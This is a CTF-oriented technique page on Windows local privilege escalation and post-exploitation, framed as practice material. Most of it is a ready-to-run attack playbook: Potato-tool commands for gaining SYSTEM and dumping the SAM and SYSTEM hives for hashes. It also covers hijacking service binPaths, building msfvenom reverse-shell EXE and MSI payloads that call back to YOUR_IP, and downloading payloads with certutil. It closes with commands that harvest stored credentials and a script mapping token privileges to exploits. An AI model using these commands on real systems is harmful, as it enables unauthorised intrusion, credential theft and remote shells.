---
title: "Windows Local Privilege Escalation and Post-Exploitation for CTF"
category: misc
subcategory: post-exploitation
type: technique
tags: [windows-privesc, seimpersonate, potato, printspoofer, godpotato, sebackupprivilege, unquoted-service-path, winpeas, dll-hijacking, alwaysinstallelevated, post-exploitation, active-directory]
difficulty: medium
summary: "From a low-priv Windows shell to SYSTEM: abuse token privileges (SeImpersonate/Potato, SeBackup), weak services, AlwaysInstallElevated, and hunt stored credentials."
when_to_use:
  - "You have a low-privileged shell on a Windows host"
  - "whoami /priv shows SeImpersonatePrivilege, SeBackupPrivilege or similar"
  - "You need SYSTEM, or credentials to move laterally"
  - "You want the standard post-exploitation loot targets"
tools: [winpeas, printspoofer, godpotato, accesschk, secretsdump, evil-winrm]
related: [ad-credential-attacks, net-reverse-shells, ad-enumeration-bloodhound]
---

## TL;DR

Enumerate with winPEAS, then attack the fastest path: a token privilege (`SeImpersonate` -> Potato
-> SYSTEM; `SeBackup` -> read SAM/ntds.dit), a misconfigured service, `AlwaysInstallElevated`, or
stored credentials in the registry/files. Windows privesc is mostly recognising one high-value
misconfiguration in a wall of enumeration output.

## Recognise it

- A shell running as a normal user or a service account (not `NT AUTHORITY\SYSTEM`).
- `whoami /priv` lists a privilege that is `Enabled` and abusable.
- A service with a writable binary/path, or `AlwaysInstallElevated` set in the registry.

## Theory

You escalate either by (a) abusing a privilege the token already holds, (b) hijacking a process that
runs as SYSTEM (a service, a scheduled task, a DLL it loads), or (c) reusing credentials found on
the box. Service accounts frequently hold `SeImpersonatePrivilege`, which the Potato family turns
into SYSTEM.

## Attack

### Step 1 -- enumerate

```powershell
# Current privileges and group membership
whoami /priv
whoami /all
whoami /groups

# System info (for kernel-exploit matching, hotfixes)
systeminfo
wmic qfe get HotFixID,InstalledOn

# Automated enumeration
.\winPEASx64.exe
.\Seatbelt.exe -group=all

# Services, scheduled tasks, installed software
sc query
Get-Service
schtasks /query /fo LIST /v
```

### Step 2 -- token privileges

**SeImpersonatePrivilege / SeAssignPrimaryToken (service accounts, IIS, MSSQL) -> Potato -> SYSTEM:**

```powershell
# PrintSpoofer (works on modern Windows where the classic potatoes do not)
.\PrintSpoofer64.exe -i -c cmd
.\PrintSpoofer64.exe -c "C:\Windows\Temp\rev.exe"

# GodPotato (broad Windows/.NET coverage)
.\GodPotato-NET4.exe -cmd "cmd /c whoami"
.\GodPotato-NET4.exe -cmd "C:\Windows\Temp\rev.exe"

# RoguePotato / JuicyPotato on older builds (need a listener port / CLSID)
.\JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c whoami" -t *
```

**SeBackupPrivilege -> read protected files (SAM/SYSTEM or ntds.dit):**

```powershell
# Save the registry hives (SeBackup lets you read them even without normal access)
reg save HKLM\SAM C:\Windows\Temp\sam.hive
reg save HKLM\SYSTEM C:\Windows\Temp\system.hive
# Copy protected files with backup semantics via robocopy /b, or diskshadow for ntds.dit
# diskshadow script:  set context persistent nowriters / add volume c: alias x / create / expose ...
```

```bash
# Offline: extract hashes from the dumped hives
secretsdump.py -sam sam.hive -system system.hive LOCAL
```

Other privileges: `SeRestore` (write anywhere -> replace a service binary), `SeTakeOwnership`
(own then rewrite a protected file), `SeDebugPrivilege` (dump lsass), `SeLoadDriverPrivilege`
(load a vulnerable driver).

### Step 3 -- service misconfigurations

```powershell
# Unquoted service path (space in path + no quotes -> plant a binary earlier in the path)
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\\" | findstr /i /v """

# Weak service permissions: can you change the binary path?
.\accesschk.exe /accepteula -uwcqv "Users" *
.\accesschk.exe /accepteula -uwcqv user servicename

# If you can reconfigure a service, point its binPath at your payload and restart it
sc config vulnsvc binpath= "C:\Windows\Temp\rev.exe"
sc stop vulnsvc & sc start vulnsvc

# Writable service binary -> replace it, restart the service
```

### Step 4 -- AlwaysInstallElevated

```powershell
# Both keys = 1 means any MSI installs as SYSTEM
reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

```bash
# Build a malicious MSI and run it on the target
msfvenom -p windows/x64/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 -f msi -o evil.msi
# on target:  msiexec /quiet /qn /i C:\Windows\Temp\evil.msi
```

### Step 5 -- autoruns, scheduled tasks, DLL hijacking

```powershell
# Autoruns / startup with writable targets
.\accesschk.exe /accepteula -wvu "C:\Program Files\SomeApp\app.exe"

# Scheduled task running as SYSTEM with a writable executable
schtasks /query /fo LIST /v | findstr /i "SYSTEM Task To Run"

# DLL hijacking: a service/app loads a DLL from a writable dir earlier in the search order
# -> drop a malicious DLL with the expected name
```

### Step 6 -- hunt stored credentials

```powershell
# Autologon credentials in the registry
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" | findstr /i "DefaultUserName DefaultPassword"

# Unattended install files (cleartext/base64 passwords)
Get-ChildItem -Path C:\ -Include unattend.xml,sysprep.inf,unattend.inf -Recurse -ErrorAction SilentlyContinue

# Saved RDP/cmdkey credentials -> reuse with runas /savecred
cmdkey /list
runas /savecred /user:corp\admin "cmd /c whoami"

# PowerShell history
type %APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

# Web app connection strings
findstr /si password C:\inetpub\wwwroot\web.config *.config

# PuTTY / VNC / WiFi stored secrets
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s
netsh wlan show profile name="SSID" key=clear

# GPP passwords in SYSVOL (see ad-enumeration-bloodhound)
findstr /S /I cpassword \\dc01\SYSVOL\*.xml
```

### Step 7 -- getting/keeping a shell

```bash
# Payloads
msfvenom -p windows/x64/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 -f exe -o rev.exe

# Transfer options: SMB server, evil-winrm upload, certutil, powershell downloadstring
# certutil:  certutil -urlcache -f http://YOUR_IP/rev.exe C:\Windows\Temp\rev.exe
# evil-winrm:  upload rev.exe
```

## Code

Parse `whoami /priv` output and flag the abusable privileges with the exact next step, so you do not
scroll past the one that matters.

```python
#!/usr/bin/env python3
"""Flag abusable Windows privileges from `whoami /priv` output.

Usage:
    whoami /priv > priv.txt      (on the target; copy the text over)
    python3 priv_check.py priv.txt
    # or pipe it:  type priv.txt | python3 priv_check.py -
"""
from __future__ import annotations

import sys

ABUSABLE = {
    "SeImpersonatePrivilege": "Potato -> SYSTEM: PrintSpoofer64.exe -i -c cmd  /  GodPotato -cmd \"...\"",
    "SeAssignPrimaryTokenPrivilege": "Potato family -> SYSTEM (as SeImpersonate)",
    "SeBackupPrivilege": "reg save HKLM\\SAM & HKLM\\SYSTEM -> secretsdump LOCAL; or copy ntds.dit",
    "SeRestorePrivilege": "write anywhere -> replace a service binary / utilman.exe trick",
    "SeTakeOwnershipPrivilege": "take ownership of a SYSTEM file then rewrite it",
    "SeDebugPrivilege": "dump lsass (procdump/nanodump) -> mimikatz offline",
    "SeLoadDriverPrivilege": "load a known-vulnerable signed driver -> kernel exec",
    "SeManageVolumePrivilege": "full access to the volume -> read/modify protected files",
    "SeTcbPrivilege": "act as part of the OS -> token creation",
}


def main(argv: list[str]) -> int:
    if len(argv) != 2:
        print(__doc__)
        return 1
    text = sys.stdin.read() if argv[1] == "-" else open(argv[1], encoding="utf-8", errors="ignore").read()

    found = False
    for line in text.splitlines():
        for priv, advice in ABUSABLE.items():
            if priv in line:
                state = "Enabled" if "Enabled" in line else "Disabled"
                marker = "***" if state == "Enabled" else "   "
                print(f"{marker} [{state}] {priv}")
                print(f"        -> {advice}")
                found = True
    if not found:
        print("[*] no directly-abusable privileges found -- pivot to service/registry/creds paths")
        print("    run winPEAS, check unquoted service paths, AlwaysInstallElevated, stored creds")
    return 0


if __name__ == "__main__":
    raise SystemExit(main(sys.argv))
```

## Variants & pitfalls

- **`whoami /priv` shows the token, not what is Enabled by default.** Many privileges can be enabled
  on demand -- a "Disabled" abusable privilege is still abusable.
- **Pick the right Potato.** PrintSpoofer/GodPotato work on modern builds; JuicyPotato only on older
  ones. Try PrintSpoofer first.
- **SeBackup reads but does not execute** -- use it to steal SAM/ntds.dit, then crack/DCSync.
- **Unquoted service path** only helps if you can write to a directory earlier in the path and
  restart the service.
- **AlwaysInstallElevated** needs *both* HKCU and HKLM keys set to 1.
- **Transfer/AV.** In CTF the built-in tools usually run; if a payload is caught, use a different
  format or a living-off-the-land technique.
- **Credential reuse.** Anything you find (autologon, cmdkey, web.config, PS history) may unlock other
  hosts -- feed it back into `netexec`.
- **Clean up** dropped binaries and reverted services where you can.

## Tools

- `winPEAS`, `Seatbelt`, `PowerUp`, `accesschk` -- enumeration.
- `PrintSpoofer`, `GodPotato`, `RoguePotato`, `JuicyPotato` -- SeImpersonate -> SYSTEM.
- `secretsdump.py` -- offline hive/ntds extraction.
- `msfvenom` -- exe/msi/dll payloads.
- `evil-winrm`, `certutil`, impacket `smbserver` -- file transfer.

## References

- Microsoft privilege documentation for the meaning of each `Se*Privilege`.
- The winPEAS checklist categories for the standard enumeration surface.
- The Potato-family project READMEs shipped with each tool.
